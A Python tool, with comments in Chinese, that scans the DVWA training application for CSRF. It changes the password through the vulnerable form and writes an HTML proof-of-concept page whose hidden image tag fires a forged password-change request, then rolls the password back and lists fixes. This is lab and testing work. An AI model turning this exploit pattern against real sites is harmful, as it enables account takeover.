import sys
import os
from time import sleep
import requests
import urllib.parse
import time
import json
import random
import string
from urllib.parse import urljoin
import urllib3
from bs4 import BeautifulSoup
from typing import Dict,  Tuple, Optional, Any
from colorama import Fore,  init

# ========== 配置相对路径 ==========
CURRENT_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))

try:
    from DVWAlogin import DvwaLogin
except ImportError as e:
    print(f"{Fore.RED}[✗] DVWA模块导入失败: {e}")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

try:
    from DVWAlogin import DvwaLogin
except ImportError as e:
    print(f"{Fore.RED}[✗] DVWA模块导入失败: {e}")
    sys.exit(1)

# ========== 配置 ==========
MAX_WORKERS = 1


# ===========================

class DvwaCSRFScanner:

    def __init__(self, timeout: int = 10, force_rollback: bool = False):
        self.timeout = timeout
        self.session = None
        self.base_url = None
        self.original_password = "password"  # DVWA默认密码
        self.current_password = self.original_password  # 动态追踪当前密码
        self.should_rollback = True  # 控制是否回滚的标志
        self.force_rollback = force_rollback  # 强制回滚标志

        # 设置报告保存目录（相对路径）
        self.report_dir = os.path.join(CURRENT_SCRIPT_DIR, 'scan_result', 'DvwaCSRFScanner')
        os.makedirs(self.report_dir, exist_ok=True)  # 自动创建目录
        print(f"{Fore.CYAN}[调试] 报告目录: {self.report_dir}")  # 调试信息

        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'forms_tested': 0,
            'csrf_points_found': 0
        }

    def cleanup(self):
        """根据用户选择执行最终清理"""
        if self.should_rollback and self.current_password != self.original_password:
            print(f"\n{Fore.YELLOW}[*] 执行最终回滚...")
            self._rollback_password()
        elif not self.should_rollback:
            print(f"\n{Fore.GREEN}[*] 按用户选择，密码保持为: {self.current_password}")

    def _rollback_password(self, max_retries=5):
        """
        - 自动刷新 session 页面确保登录状态正常
        - 自动从真实表单重新获取 action URL
        - 自动匹配 DVWA 多语言/多版本成功提示
        - 使用当前密码进行回滚
        """
        if not self.session or not self.base_url:
            return False

        try:
            # 重新获取一次当前表单，避免使用旧的 URL
            form = self.extract_csrf_form()
            if not form:
                print(f"{Fore.RED}[✗] 无法回滚：未找到密码修改表单")
                return False

            rollback_url = form['action']
            current_pass = self.current_password
            original_pass = self.original_password

            # DVWA 可能 session 超时 → 先访问一次页面刷新状态
            try:
                self.session.get(rollback_url, timeout=5)
            except:
                pass

            for attempt in range(1, max_retries + 1):
                try:
                    data = {
                        "password_current": current_pass,
                        "password_new": original_pass,
                        "password_conf": original_pass,
                        "Change": "Change"
                    }

                    ok, resp = self.send_request(
                        rollback_url,
                        method=form['method'],
                        **({'params': data} if form['method'] == 'GET' else {'data': data})
                    )

                    if not ok or not resp:
                        print(f"{Fore.YELLOW}[!] 回滚请求失败，第{attempt}次重试…")
                        time.sleep(1)
                        continue

                    text = resp.text.lower()

                    success_keywords = [
                        'password changed',
                        'password updated',
                        'password has been changed',
                        'successfully'
                    ]

                    if any(k in text for k in success_keywords):
                        print(f"{Fore.GREEN}[✓] 密码回滚成功：{original_pass}")
                        self.current_password = original_pass
                        return True

                    print(f"{Fore.YELLOW}[!] 第{attempt}次回滚失败，页面未返回成功提示")

                except Exception as e:
                    print(f"{Fore.YELLOW}[!] 回滚异常: {e}，重试中…")

                time.sleep(1)

            print(f"{Fore.RED}[✗] 回滚失败，请手动将密码恢复为：{original_pass}")
            return False

        except Exception as e:
            print(f"{Fore.RED}[✗] 回滚出现致命错误: {e}")
            return False

    def setup_session(self, dvwa_login_instance: DvwaLogin) -> bool:
        """设置会话"""
        try:
            session_info = dvwa_login_instance.get_session_info()
            if not session_info or 'session' not in session_info:
                print(f"{Fore.RED}[✗] 会话信息无效")
                return False

            self.session = session_info['session']
            self.base_url = session_info['base_url']
            print(f"{Fore.GREEN}[✓] 会话设置: {self.base_url}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] 设置失败: {e}")
            return False

    def detect_dvwa_level(self) -> str:
        """检测DVWA安全等级"""
        try:
            response = self.session.get(f"{self.base_url}/security.php", timeout=10)
            if 'low' in response.text:
                return 'low'
            elif 'medium' in response.text:
                return 'medium'
            elif 'high' in response.text:
                return 'high'
            return 'unknown'
        except:
            return 'unknown'

    def send_request(self, url: str, method: str = 'GET', data: Dict = None, params: Dict = None,
                     headers: Dict = None, json_data: Any = None) -> Tuple[bool, Optional[requests.Response]]:
        headers = headers or {}
        try:
            resp = self.session.request(
                method=method.upper(),
                url=url,
                params=params,
                data=data,
                json=json_data,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            return True, resp
        except Exception as e:
            print(f"{Fore.RED}[✗] 请求失败: {e}")
            return False, None

    def extract_csrf_form(self) -> Dict[str, Any]:
        target_url = f"{self.base_url}/vulnerabilities/csrf/"
        success, response = self.send_request(target_url)
        if not success or not response:
            return {}

        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            return {}

        raw_action = form.get('action', '').strip()
        if raw_action in ['', '#']:
            action = target_url
        else:
            action = urljoin(target_url, raw_action)

        method = form.get('method', 'POST').upper()

        inputs = []
        for tag in form.find_all(['input', 'textarea', 'select', 'button']):
            name = tag.get('name')
            if name and 'token' not in name.lower() and 'csrf' not in name.lower():
                inputs.append(name)

        return {'action': action, 'method': method, 'inputs': inputs}

    def test_csrf_vulnerability(self, level: str) -> Dict[str, Any]:
        """
        漏洞测试
        """
        form = self.extract_csrf_form()
        if not form:
            return {'vulnerable': False, 'reason': '未找到CSRF表单'}

        # 修改：使用固定密码"baipi666"
        new_pass = "baipi666"
        old_pass = self.current_password  # 旧密码记录，用于验证 & 回滚

        test_data = {
            'password_current': old_pass,
            'password_new': new_pass,
            'password_conf': new_pass,
            'Change': 'Change'
        }

        try:
            ok, resp = self.send_request(
                form['action'],
                method=form['method'],
                **({'params': test_data} if form['method'] == 'GET' else {'data': test_data})
            )

            if not ok or not resp:
                return {'vulnerable': False, 'reason': '请求失败'}

            # 多版本 DVWA 的可能成功提示
            success_keywords = [
                'password changed',
                'password updated',
                'password has been changed',
                'successfully'
            ]

            text = resp.text.lower()
            success = any(k in text for k in success_keywords)

            if success:
                #  更新当前密码（用于回滚）
                self.current_password = new_pass

                vuln_info = {
                    'vulnerable': True,
                    'level': level,
                    'target_url': form['action'],
                    'method': form['method'],
                    'payload': test_data,
                    'risk_level': 'high',
                }

                # 生成POC（保存到指定目录）
                filename = self.generate_poc_html(vuln_info)
                vuln_info['poc_file'] = filename

                return vuln_info

            return {'vulnerable': False, 'reason': '页面未返回成功提示'}

        except Exception as e:
            return {'vulnerable': False, 'reason': f'异常: {e}'}

        # 移除 finally 中的自动回滚，改为外部控制

    def generate_poc_html(self, vuln):
        """生成POC HTML文件到指定目录"""
        random_str = ''.join(random.choices(string.ascii_lowercase, k=6))
        # 使用绝对路径保存文件
        abs_filename = os.path.join(self.report_dir, f"csrf_poc_{vuln['level']}_{random_str}.html")
        # 生成相对路径用于显示
        rel_filename = os.path.relpath(abs_filename, CURRENT_SCRIPT_DIR)

        print(f"{Fore.CYAN}[调试] POC绝对路径: {abs_filename}")  # 调试信息
        print(f"{Fore.CYAN}[调试] POC相对路径: {rel_filename}")  # 调试信息

        # 构造 GET URL（Low 只有 GET）
        base_url = vuln['target_url']
        params = urllib.parse.urlencode(vuln['payload'])
        attack_url = f"{base_url}?{params}"

        html = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>CSRF POC - {vuln['level'].upper()}</title>
    </head>
    <body>
        <h2>CSRF POC - {vuln['level'].upper()}</h2>
        <p>打开此页面时将自动向 DVWA 发送修改密码请求</p>

        <!-- 使用 img 发送 GET 请求 -->
        <img src="{attack_url}" style="display:none;">

        <p style="color:red;">CSRF 攻击已发送，请检查密码是否被修改！</p>
    </body>
    </html>
    """

        # 确保只在此位置创建文件
        with open(abs_filename, "w", encoding="utf-8") as f:
            f.write(html)

        # 返回相对路径仅用于显示
        return rel_filename

    def scan_dvwa_csrf(self) -> Dict[str, Any]:
        """主扫描入口"""
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[✗] 未初始化会话")
            return {}

        # 检测等级
        level = self.detect_dvwa_level()
        print(f"{Fore.GREEN}[*] DVWA安全等级: {level.upper()}")

        self.results['target_url'] = self.base_url
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        # 新增：询问用户是否回滚密码
        if self.force_rollback:
            print(f"\n{Fore.YELLOW}[*] 强制模式：自动回滚密码")
            self.should_rollback = True
        else:
            print(f"\n{Fore.YELLOW}[?] 由于现代浏览器默认SameSite=Lax，CSRF POC可能无效")
            print(f"{Fore.YELLOW}[?] 是否要在测试后回滚密码到原始值？")
            choice = input(f"{Fore.YELLOW}[?] 输入 'y' 回滚，输入 'n' 不回滚 (默认: y): ").strip().lower()
            self.should_rollback = choice != 'n'

        if self.should_rollback:
            print(f"{Fore.GREEN}[*] 已启用测试后回滚密码")
        else:
            # 增强警告信息
            print(f"\n{Fore.RED}[!] ===========================================")
            print(f"{Fore.RED}[!] 警告：您选择了不回滚密码！")
            print(f"{Fore.RED}[!] 密码已修改为: baipi666")
            print(f"{Fore.RED}[!] 后续扫描模块（SQL、XSS、命令注入等）将无法登录！")
            print(f"{Fore.RED}[!] 必须手动将密码改回 'password' 才能继续")
            print(f"{Fore.YELLOW}[!] 操作步骤：")
            print(f"{Fore.YELLOW}[!] 1. 使用 'baipi666' 登录 DVWA")
            print(f"{Fore.YELLOW}[!] 2. 进入 CSRF 漏洞页面")
            print(f"{Fore.YELLOW}[!] 3. 将密码改回 'password'")
            print(f"{Fore.RED}[!] ===========================================")
        print(f"\n{Fore.YELLOW}[扫描目标: {self.base_url}/vulnerabilities/csrf/]")

        # 测试漏洞
        vuln_result = self.test_csrf_vulnerability(level)

        if vuln_result.get('vulnerable'):
            self.results['vulnerabilities'].append(vuln_result)
            self.results['csrf_points_found'] = 1
            self.results['forms_tested'] = 1

            # 根据用户选择决定是否回滚
            if self.should_rollback:
                print(f"\n{Fore.CYAN}[*] 正在回滚密码...")
                self._rollback_password()
            else:
                print(f"\n{Fore.YELLOW}[*] 跳过回滚，密码保持为: baipi666")

        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        """生成报告"""
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'forms_tested': self.results['forms_tested'],
                'csrf_points_found': self.results['csrf_points_found'],
                'poc_files': [v.get('poc_file') for v in self.results['vulnerabilities']],
                'rollback_enabled': self.should_rollback,  # 新增：记录回滚配置
                'report_dir': self.report_dir  # 新增：记录报告目录
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "实施CSRF Token（随机+单次有效）",
                "验证Referer/Origin头",
                "使用SameSite=Strict Cookie",
                "重要操作要求二次验证",
                "限制请求频率"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        """打印报告"""
        summary = report['scan_summary']

        print(f"\n{Fore.YELLOW}{'=' * 70}")
        print(f"  {Fore.CYAN}DVWA CSRF扫描报告")
        print(f"{Fore.YELLOW}{'=' * 70}")
        print(f"{Fore.GREEN}等级: {self.detect_dvwa_level().upper()}")
        print(f"{Fore.GREEN}表单: {summary['forms_tested']}个")
        print(f"{Fore.GREEN}漏洞: {summary['csrf_points_found']}个")
        print(f"{Fore.YELLOW}回滚: {'已启用' if summary['rollback_enabled'] else '已禁用'}")
        print(f"{Fore.CYAN}报告目录: {summary['report_dir']}")  # 新增：显示报告目录
        print(f"{Fore.YELLOW}{'=' * 70}")

        if not report['vulnerabilities']:
            print(f"{Fore.GREEN}\n[✓] 未发现CSRF漏洞")
            return

        for vuln in report['vulnerabilities']:
            print(f"\n{Fore.RED}[!] CSRF漏洞验证成功！")
            print(f"{Fore.CYAN}方法: {vuln['method']}")
            print(f"{Fore.CYAN}目标: {vuln['target_url']}")
            print(f"{Fore.CYAN}新密码: baipi666")  # 新增：显示固定密码
            if vuln.get('bypass'):
                print(f"{Fore.MAGENTA}绕过: {vuln['bypass']}")
            print(f"{Fore.GREEN}[POC] {vuln['poc_file']}")

        print(f"\n{Fore.CYAN}修复建议:")
        for i, rec in enumerate(report['recommendations'], 1):
            print(f"  {i}. {rec}")


def main():
    """主函数"""
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"  DVWA CSRF扫描器 v3.0")
    print(f"{Fore.CYAN}{'=' * 70}")

    dvwa_url = input(f"\n{Fore.YELLOW}[?] DVWA URL: ").strip()
    if not dvwa_url:
        print(f"{Fore.RED}[✗] URL不能为空")
        return

    # 登录
    print(f"\n{Fore.CYAN}[步骤 1/2] 登录...")
    dvwa_login = DvwaLogin()
    if not dvwa_login.login(dvwa_url):
        print(f"{Fore.RED}[✗] 登录失败")
        return
    dvwa_login.test_connection()

    # 扫描
    print(f"{Fore.CYAN}[步骤 2/2] 扫描...")
    scanner = DvwaCSRFScanner(timeout=15)
    if not scanner.setup_session(dvwa_login):
        return

    # 使用 try-finally
    try:
        report = scanner.scan_dvwa_csrf()
        scanner.print_report(report)

        # 修改：根据配置决定是否验证回滚
        if scanner.should_rollback:
            print(f"\n{Fore.YELLOW}[*] 验证回滚结果...")
            # 重新创建Session测试
            test_login = DvwaLogin()
            if test_login.login(dvwa_url):  # 使用原始密码登录
                print(f"{Fore.GREEN}[✓] 验证成功：密码已回滚到 {scanner.original_password}")
            else:
                print(f"{Fore.RED}[✗] 验证失败：密码未正确回滚！")
        else:
            print(f"\n{Fore.YELLOW}[*] 回滚已禁用，跳过验证")
            print(f"{Fore.YELLOW}[*] 当前密码应为: baipi666")

        # 保存报告到指定目录
        abs_report_path = os.path.join(scanner.report_dir, f"dvwa_csrf_report_{int(time.time())}.json")
        rel_report_path = os.path.relpath(abs_report_path, CURRENT_SCRIPT_DIR)

        print(f"{Fore.CYAN}[调试] 报告绝对路径: {abs_report_path}")  # 调试信息
        print(f"{Fore.CYAN}[调试] 报告相对路径: {rel_report_path}")  # 调试信息

        with open(abs_report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(f"\n{Fore.GREEN}[✓] 报告已保存: {rel_report_path}")

    finally:
        # 确保清理逻辑执行，但受用户选择控制
        if scanner:
            scanner.cleanup()


if __name__ == "__main__":
    main()